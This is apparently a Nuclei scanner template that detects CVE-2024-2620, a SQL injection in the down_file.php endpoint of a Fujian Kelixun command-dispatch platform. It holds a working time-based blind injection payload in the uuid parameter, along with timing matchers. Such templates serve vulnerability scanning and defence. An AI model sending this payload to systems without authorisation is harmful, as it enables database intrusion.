id: cve-2024-2620
info:
  name: 福建科立讯通信 指挥调度管理平台 SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: CVE-2024-2620,sqli
  description: |
    福建科立讯通信 指挥调度管理平台 suffers from a SQL injection vulnerability that allows attackers to execute arbitrary SQL commands.

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: GET
    path:
      - "/api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP({{t1}})))pwaA)%20AND%20%27dDhF%27=%27dDhF"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "数据库没有此记录"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < t2"
